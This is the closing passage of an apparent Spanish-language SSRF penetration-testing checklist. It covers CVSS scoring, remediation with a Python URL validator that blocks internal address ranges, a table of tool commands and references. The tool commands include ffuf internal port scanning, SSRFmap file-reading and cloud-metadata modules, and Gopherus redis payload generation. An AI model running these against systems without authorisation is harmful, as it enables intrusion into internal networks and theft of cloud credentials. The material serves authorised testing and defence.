| SSRF ciega solo hacia Internet (OAST), sin acceso interno | `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` (5.3) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N` |
| Escaneo de puertos/hosts internos (oráculo) | `AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N` (5.8) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:L/SI:N/SA:N` |
| Lectura de servicios internos o ficheros locales | `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` (8.6) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N` |
| Ídem con usuario autenticado de bajo privilegio | `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` (7.7) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N` |
| Credenciales cloud con permisos amplios / RCE interna | `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` (10.0) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` |
| Explotación que exige DNS rebinding o carrera | sube `AC:H` | `AT:P` |

Calcula la puntuación 4.0 exacta en la calculadora oficial de FIRST. El impacto en sistemas posteriores (`SC/SI/SA`) refleja que el daño recae en la red interna o la cuenta cloud, no en la aplicación vulnerable.

## 11. Remediación (con ejemplo de código correcto)

1. **Evita las URLs arbitrarias**: trabaja con identificadores (`integration_id`) que el servidor traduce a URLs conocidas.
2. Si deben aceptarse URLs: **lista blanca** de esquemas (`https`) y, cuando sea posible, de dominios exactos.
3. **Resuelve y valida la IP** de cada conexión (incluidas las de redirecciones) y **conéctate a la IP validada** para evitar el rebinding; bloquea loopback, privadas, link-local, CGNAT (`100.64/10`), ULA IPv6 (`fc00::/7`), IPv4 mapeadas en IPv6 y `0.0.0.0`.
4. **No sigas redirecciones** o revalida cada salto.
5. Defensa en red: **proxy de salida** (*egress proxy*, p. ej. Smokescreen de Stripe) que aplique la política, segmentación y reglas de firewall de salida; aislar los *workers* que hacen fetch.
6. Cloud: **IMDSv2 obligatorio** con *hop limit* 1, roles con privilegio mínimo, bloquear `169.254.169.254` desde contenedores que no lo necesiten; en GKE, Workload Identity / metadata concealment; en Azure, identidades gestionadas con alcance mínimo.
7. No devuelvas al usuario el cuerpo ni los errores detallados de la petición interna.

```python
import ipaddress, socket, requests
from urllib.parse import urlsplit
from requests.adapters import HTTPAdapter

BLOCKED = [ipaddress.ip_network(n) for n in (
    "0.0.0.0/8","10.0.0.0/8","100.64.0.0/10","127.0.0.0/8","169.254.0.0/16","172.16.0.0/12",
    "192.168.0.0/16","::1/128","fc00::/7","fe80::/10","::ffff:0:0/96")]

def _check(host: str) -> str:
    infos = socket.getaddrinfo(host, None)
    ips = {ipaddress.ip_address(i[4][0]) for i in infos}
    for ip in ips:
        if any(ip in n for n in BLOCKED) or not ip.is_global:
            raise ValueError(f"destino bloqueado: {ip}")
    return str(next(iter(ips)))

def safe_fetch(url: str, allowed_hosts: set[str] | None = None) -> requests.Response:
    p = urlsplit(url)
    if p.scheme not in ("http", "https") or not p.hostname or p.username or p.password:
        raise ValueError("URL no permitida")
    if allowed_hosts and p.hostname.lower() not in allowed_hosts:
        raise ValueError("host fuera de lista blanca")
    _check(p.hostname)
    # Para cerrar el rebinding, conecta a la IP validada (adaptador con resolución fijada)
    # o envía la petición a través de un proxy de egress que repita la validación.
    return requests.get(url, allow_redirects=False, timeout=5, stream=True)
```

## 12. Herramientas (comando y cuándo usarla; automatización solo tras confirmación manual, nunca como primer barrido)

| Herramienta | Uso | Cuándo |
|---|---|---|
| Burp Collaborator / `interactsh-client` | `interactsh-client -v -o oast.log` (preferible servidor autoalojado) | Desde la primera sonda ciega |
| Burp Repeater / Intruder | Oráculos de tiempo y de error, listas cortas de puertos | Tras confirmar SSRF |
| `ffuf` | `ffuf -u 'https://t/p?url=http://127.0.0.1:FUZZ/' -w ports.txt -rate 5 -mc all` | Mapeo interno con límite de velocidad |
| SSRFmap | `python3 ssrfmap.py -r req.txt -p url -m readfiles` (módulos: `portscan`, `readfiles`, `aws`, `gcp`…) | Solo después de confirmar manualmente; revisa qué hace cada módulo |
| Gopherus | `gopherus --exploit redis` (también `mysql`, `fastcgi`, `smtp`…) | ⚠️ Genera cargas que modifican estado: solo con confirmación explícita del cliente |
| Singularity of Origin / rbndr | Servidor de DNS rebinding | Cuando la validación resuelve antes de conectar |
| `redir.py` (§3) | Redirecciones 301/302/307/308 | Para probar el seguimiento de redirecciones |
| Burp Param Miner | Descubrir parámetros/cabeceras ocultas que reciben URLs | Reconocimiento |
| Nuclei | Plantillas de SSRF con OAST (`-tags ssrf`) | Verificación a escala tras validar el patrón a mano |

## 13. Referencias

- OWASP — Server Side Request Forgery Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- OWASP WSTG — WSTG-INPV-19 Testing for Server-Side Request Forgery
- OWASP API Security Top 10:2023 — API7 Server Side Request Forgery
- PortSwigger Web Security Academy — SSRF: https://portswigger.net/web-security/ssrf
- PortSwigger — Blind SSRF y OAST: https://portswigger.net/web-security/ssrf/blind
- Orange Tsai — "A New Era of SSRF: Exploiting URL Parser in Trending Programming Languages" (Black Hat USA 2017)
- PayloadsAllTheThings — Server Side Request Forgery: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
- HackTricks — SSRF (book.hacktricks.wiki, sección *pentesting-web*) y "Cloud SSRF"
- AWS — Instance Metadata Service v2: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
- Google Cloud — Metadata server; Azure — Instance Metadata Service (documentación oficial)
- CWE-918: https://cwe.mitre.org/data/definitions/918.html
- SnailSploit offensive-checklist (SSRF), licencia MIT
